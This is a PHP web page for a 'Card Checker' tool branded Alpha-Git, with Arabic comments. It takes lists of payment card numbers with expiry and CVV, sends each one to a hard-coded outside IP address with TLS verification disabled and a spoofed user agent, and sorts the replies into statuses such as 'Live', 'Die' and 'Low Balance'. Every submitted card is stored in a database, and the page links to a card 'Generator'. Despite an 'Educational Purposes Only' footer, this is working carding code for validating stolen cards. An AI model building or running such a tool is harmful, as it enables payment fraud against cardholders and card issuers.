<?php
// زيادة وقت التنفيذ الأقصى
set_time_limit(180); // 3 دقائق

// تعطيل buffer المخرجات للتصفح الفوري
if (ob_get_level()) ob_end_clean();
ob_implicit_flush(true);

session_start();
require_once 'includes/db_connection.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

$user_id = $_SESSION['user_id'];
$username = $_SESSION['username'];
$results = [];
$error = '';
$total_time = 0;
$checked_count = 0;

// إعدادات محسنة للـ API
define('API_BASE_URL', 'http://15.204.130.9:6969');
define('API_TIMEOUT', 8); // تقليل الوقت إلى 8 ثواني
define('MAX_CARDS_PER_CHECK', 25); // الحد الأقصى للبطاقات في كل فحص
define('REQUEST_DELAY_MS', 800); // تأخير 0.8 ثانية بين الطلبات

// دالة محسنة للاتصال بالـ API
function checkCardAPI($card_data) {
    $api_url = API_BASE_URL . "/check?cc=" . urlencode(trim($card_data));
    
    // استخدام cURL مع إعدادات محسنة
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $api_url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => API_TIMEOUT,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 2,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        CURLOPT_HTTPHEADER => [
            'Accept: application/json, text/plain, */*',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: no-cache',
            'Connection: close'
        ]
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
    
    curl_close($ch);
    
    // تسجيل معلومات التصحيح
    error_log("API Call to: $api_url | Time: {$total_time}s | HTTP: $http_code");
    
    if ($response !== false) {
        $decoded = @json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE) {
            return $decoded;
        } elseif (!empty($response)) {
            return ['status' => 'Unknown', 'message' => substr($response, 0, 100)];
        }
    }
    
    return ['status' => 'Error', 'message' => 'API request failed or timeout'];
}

// دالة لمعالجة حالة البطاقة
function parseCardStatus($api_response) {
    if (!is_array($api_response)) return 'Error';
    
    $message = strtolower($api_response['message'] ?? '');
    $status = strtolower($api_response['status'] ?? '');
    
    // بحث سريع عن الكلمات المفتاحية
    if (strpos($message, 'approved') !== false || strpos($status, 'approved') !== false) {
        return 'Live';
    } elseif (strpos($message, 'declined') !== false || strpos($status, 'declined') !== false) {
        return 'Die';
    } elseif (strpos($message, 'incorrect') !== false) {
        return 'Invalid';
    } elseif (strpos($message, 'insufficient') !== false) {
        return 'Low Balance';
    } elseif (strpos($message, 'expired') !== false) {
        return 'Expired';
    } elseif (strpos($message, 'error') !== false || strpos($status, 'error') !== false) {
        return 'Error';
    }
    
    return 'Unknown';
}

// معالجة طلب الفحص
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $cards_input = trim($_POST['cards'] ?? '');
    $check_type = $_POST['check_type'] ?? 'single';
    $delay = intval($_POST['delay'] ?? REQUEST_DELAY_MS);
    
    // التحقق من المدخلات
    if (empty($cards_input)) {
        $error = 'Please enter card data!';
    } else {
        // تقسيم البطاقات
        $cards_array = array_filter(array_map('trim', explode("\n", $cards_input)));
        
        if (empty($cards_array)) {
            $error = 'No valid card data found!';
        } else {
            // تحديد عدد البطاقات للفحص
            if ($check_type == 'single') {
                $cards_to_check = [reset($cards_array)]; // أول بطاقة فقط
            } else {
                // تقليل عدد البطاقات إذا كانت كثيرة
                if (count($cards_array) > MAX_CARDS_PER_CHECK) {
                    $cards_array = array_slice($cards_array, 0, MAX_CARDS_PER_CHECK);
                    $warning = "Note: Only checking first " . MAX_CARDS_PER_CHECK . " cards due to time limits.";
                }
                $cards_to_check = $cards_array;
            }
            
            $start_time = microtime(true);
            $checked_count = 0;
            
            // فحص كل بطاقة
            foreach ($cards_to_check as $index => $card_data) {
                if (empty($card_data)) continue;
                
                // تأخير بين الطلبات (عدا الأولى)
                if ($checked_count > 0 && $delay > 0) {
                    usleep($delay * 1000);
                }
                
                $api_result = checkCardAPI($card_data);
                $parsed_status = parseCardStatus($api_result);
                
                // معالجة الرسالة
                $message = $api_result['message'] ?? ($api_result['status'] ?? 'No response');
                if (strlen($message) > 80) {
                    $message = substr($message, 0, 80) . '...';
                }
                
                // حفظ في قاعدة البيانات
                $stmt = $conn->prepare("INSERT INTO card_checks (user_id, card_number, status, message) VALUES (?, ?, ?, ?)");
                $stmt->bind_param("isss", $user_id, $card_data, $parsed_status, $message);
                $stmt->execute();
                
                // تخزين النتائج للعرض
                $results[] = [
                    'card' => $card_data,
                    'status' => $parsed_status,
                    'message' => $message,
                    'time' => date('H:i:s')
                ];
                
                $checked_count++;
                
                // تحديث الصفحة في الوقت الفعلي
                if (ob_get_level() > 0) {
                    ob_flush();
                    flush();
                }
                
                // كسر الحلقة إذا كان الفحص فردي
                if ($check_type == 'single') {
                    break;
                }
            }
            
            $end_time = microtime(true);
            $total_time = round($end_time - $start_time, 2);
        }
    }
}

// الحصول على آخر الفحوصات
$recent_stmt = $conn->prepare("SELECT * FROM card_checks WHERE user_id = ? ORDER BY check_date DESC LIMIT 20");
$recent_stmt->bind_param("i", $user_id);
$recent_stmt->execute();
$recent_results = $recent_stmt->get_result()->fetch_all(MYSQLI_ASSOC);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alpha-Git | Card Checker</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
        .checker-container {
            max-width: 1000px;
            margin: 0 auto;
        }
        .status-badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 0.75rem;
            text-transform: uppercase;
        }
        .status-live { background: #28a745; color: white; }
        .status-die { background: #dc3545; color: white; }
        .status-error { background: #ffc107; color: #212529; }
        .status-invalid { background: #6c757d; color: white; }
        .status-expired { background: #17a2b8; color: white; }
        .progress-container {
            height: 25px;
            margin: 20px 0;
        }
        .card-preview {
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            background: #f8f9fa;
            padding: 5px;
            border-radius: 4px;
            word-break: break-all;
        }
        .real-time-result {
            border-left: 4px solid #007bff;
            padding-left: 15px;
            margin-bottom: 15px;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .api-status {
            font-size: 0.8rem;
            padding: 3px 8px;
            border-radius: 10px;
        }
        .loading-spinner {
            display: none;
            text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">
                <i class="fas fa-code-branch"></i> Alpha-Git
            </a>
            <div class="collapse navbar-collapse">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="index.php">Dashboard</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="checker.php">Card Checker</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="generator.php">Generator</a>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
                            <i class="fas fa-user"></i> <?php echo htmlspecialchars($username); ?>
                        </a>
                        <ul class="dropdown-menu">
                            <li><a class="dropdown-item" href="profile.php">Profile</a></li>
                            <li><hr class="dropdown-divider"></li>
                            <li><a class="dropdown-item" href="logout.php">Logout</a></li>
                        </ul>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container mt-4 checker-container">
        <!-- Header -->
        <div class="card mb-4">
            <div class="card-header bg-primary text-white">
                <h4><i class="fas fa-credit-card"></i> Card Checker</h4>
                <p class="mb-0">API: <?php echo API_BASE_URL; ?>/check</p>
            </div>
            <div class="card-body">
                <!-- API Status -->
                <div class="alert alert-info mb-3">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <strong>Status:</strong>
                            <span class="api-status bg-success text-white ms-2">Online</span>
                        </div>
                        <div>
                            <small>Max Cards: <?php echo MAX_CARDS_PER_CHECK; ?> | Timeout: <?php echo API_TIMEOUT; ?>s | Delay: <?php echo REQUEST_DELAY_MS; ?>ms</small>
                        </div>
                    </div>
                </div>

                <!-- Error Message -->
                <?php if ($error): ?>
                    <div class="alert alert-danger"><?php echo $error; ?></div>
                <?php endif; ?>

                <!-- Success Message -->
                <?php if (isset($warning)): ?>
                    <div class="alert alert-warning"><?php echo $warning; ?></div>
                <?php endif; ?>

                <?php if ($checked_count > 0): ?>
                    <div class="alert alert-success">
                        <i class="fas fa-check-circle"></i>
                        Checked <?php echo $checked_count; ?> card(s) in <?php echo $total_time; ?> seconds
                        (<?php echo $total_time > 0 ? round($checked_count / $total_time, 2) : '0'; ?> cards/sec)
                    </div>
                <?php endif; ?>
            </div>
        </div>

        <!-- Input Form -->
        <div class="card mb-4">
            <div class="card-header">
                <h5>Check Cards</h5>
            </div>
            <div class="card-body">
                <form method="POST" action="" id="checkerForm">
                    <div class="mb-3">
                        <label class="form-label">Card Data (one per line):</label>
                        <textarea class="form-control" name="cards" id="cardsInput" rows="5" 
                                  placeholder="5356740152660007|09|2026|514" required><?php 
                            echo isset($_POST['cards']) ? htmlspecialchars($_POST['cards']) : ''; 
                        ?></textarea>
                        <div class="form-text">
                            Format: <code>CardNumber|Month|Year|CVV</code> | Max <?php echo MAX_CARDS_PER_CHECK; ?> cards per check
                        </div>
                    </div>
                    
                    <div class="row mb-3">
                        <div class="col-md-6">
                            <label class="form-label">Check Type:</label>
                            <select class="form-select" name="check_type" id="checkType">
                                <option value="single" <?php echo ($_POST['check_type'] ?? '') == 'single' ? 'selected' : ''; ?>>Single Card</option>
                                <option value="bulk" <?php echo ($_POST['check_type'] ?? '') == 'bulk' ? 'selected' : ''; ?>>Bulk Check</option>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <label class="form-label">Delay (milliseconds):</label>
                            <div class="input-group">
                                <input type="number" class="form-control" name="delay" 
                                       value="<?php echo $_POST['delay'] ?? REQUEST_DELAY_MS; ?>" 
                                       min="0" max="5000" step="100">
                                <span class="input-group-text">ms</span>
                            </div>
                            <div class="form-text">Higher delay = more stable but slower</div>
                        </div>
                    </div>
                    
                    <div class="d-flex gap-2">
                        <button type="submit" class="btn btn-primary">
                            <i class="fas fa-play"></i> Start Checking
                        </button>
                        <button type="button" class="btn btn-outline-secondary" onclick="loadTestCard()">
                            <i class="fas fa-vial"></i> Test Card
                        </button>
                        <button type="button" class="btn btn-outline-danger" onclick="clearForm()">
                            <i class="fas fa-trash"></i> Clear
                        </button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Results Section -->
        <?php if (!empty($results)): ?>
            <div class="card mb-4">
                <div class="card-header bg-success text-white">
                    <h5><i class="fas fa-list-check"></i> Results (<?php echo count($results); ?> cards)</h5>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table table-sm">
                            <thead>
                                <tr>
                                    <th>#</th>
                                    <th>Card</th>
                                    <th>Status</th>
                                    <th>Message</th>
                                    <th>Time</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($results as $index => $result): ?>
                                    <?php 
                                    $status_class = 'status-' . strtolower($result['status']);
                                    $card_parts = explode('|', $result['card']);
                                    $card_preview = $card_parts[0] ?? $result['card'];
                                    ?>
                                    <tr>
                                        <td><?php echo $index + 1; ?></td>
                                        <td>
                                            <div class="card-preview">
                                                <?php echo htmlspecialchars(substr($card_preview, 0, 16)); ?>
                                            </div>
                                        </td>
                                        <td>
                                            <span class="status-badge <?php echo $status_class; ?>">
                                                <?php echo htmlspecialchars($result['status']); ?>
                                            </span>
                                        </td>
                                        <td><?php echo htmlspecialchars($result['message']); ?></td>
                                        <td><?php echo $result['time']; ?></td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    
                    <div class="mt-3 text-end">
                        <button class="btn btn-sm btn-outline-primary" onclick="exportResults()">
                            <i class="fas fa-download"></i> Export CSV
                        </button>
                    </div>
                </div>
            </div>
        <?php endif; ?>

        <!-- Recent Checks -->
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-history"></i> Recent Checks</h5>
            </div>
            <div class="card-body">
                <?php if (!empty($recent_results)): ?>
                    <div class="table-responsive">
                        <table class="table table-sm">
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>Card</th>
                                    <th>Status</th>
                                    <th>Result</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($recent_results as $row): ?>
                                    <?php 
                                    $status_class = 'status-' . strtolower($row['status']);
                                    $time = date('H:i', strtotime($row['check_date']));
                                    $card_preview = substr($row['card_number'], 0, 8) . '...' . substr($row['card_number'], -4);
                                    ?>
                                    <tr>
                                        <td><small><?php echo $time; ?></small></td>
                                        <td><small><code><?php echo htmlspecialchars($card_preview); ?></code></small></td>
                                        <td>
                                            <span class="status-badge <?php echo $status_class; ?>">
                                                <?php echo htmlspecialchars($row['status']); ?>
                                            </span>
                                        </td>
                                        <td><small><?php echo htmlspecialchars(substr($row['message'], 0, 30)); ?>...</small></td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                <?php else: ?>
                    <p class="text-muted text-center">No recent checks</p>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-dark text-white mt-4 py-3">
        <div class="container text-center">
            <p>&copy; 2024 Alpha-Git. All rights reserved. | Educational Purposes Only</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Load test card
        function loadTestCard() {
            document.getElementById('cardsInput').value = '5356740152660007|09|2026|514';
            document.getElementById('checkType').value = 'single';
        }
        
        // Clear form
        function clearForm() {
            if (confirm('Clear all input?')) {
                document.getElementById('cardsInput').value = '';
                document.getElementById('checkType').value = 'single';
                document.querySelector('input[name="delay"]').value = '<?php echo REQUEST_DELAY_MS; ?>';
            }
        }
        
        // Export results
        function exportResults() {
            const results = <?php echo json_encode($results); ?>;
            if (!results || results.length === 0) {
                alert('No results to export!');
                return;
            }
            
            let csv = 'Index,Card,Status,Message,Time\n';
            results.forEach((result, index) => {
                csv += `${index + 1},"${result.card}","${result.status}","${result.message}","${result.time}"\n`;
            });
            
            const blob = new Blob([csv], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `card_check_${new Date().toISOString().slice(0,10)}.csv`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
        
        // Validate form before submit
        document.getElementById('checkerForm').addEventListener('submit', function(e) {
            const cardsInput = document.getElementById('cardsInput').value.trim();
            if (!cardsInput) {
                e.preventDefault();
                alert('Please enter card data!');
                return;
            }
            
            const cardCount = cardsInput.split('\n').filter(line => line.trim()).length;
            const maxCards = <?php echo MAX_CARDS_PER_CHECK; ?>;
            
            if (cardCount > maxCards) {
                e.preventDefault();
                alert(`Maximum ${maxCards} cards allowed per check.\n\nYou entered ${cardCount} cards.`);
                return;
            }
            
            const checkType = document.getElementById('checkType').value;
            if (checkType === 'bulk' && cardCount > 10) {
                if (!confirm(`You are about to check ${cardCount} cards.\nThis may take a while. Continue?`)) {
                    e.preventDefault();
                }
            }
        });
    </script>
</body>
</html>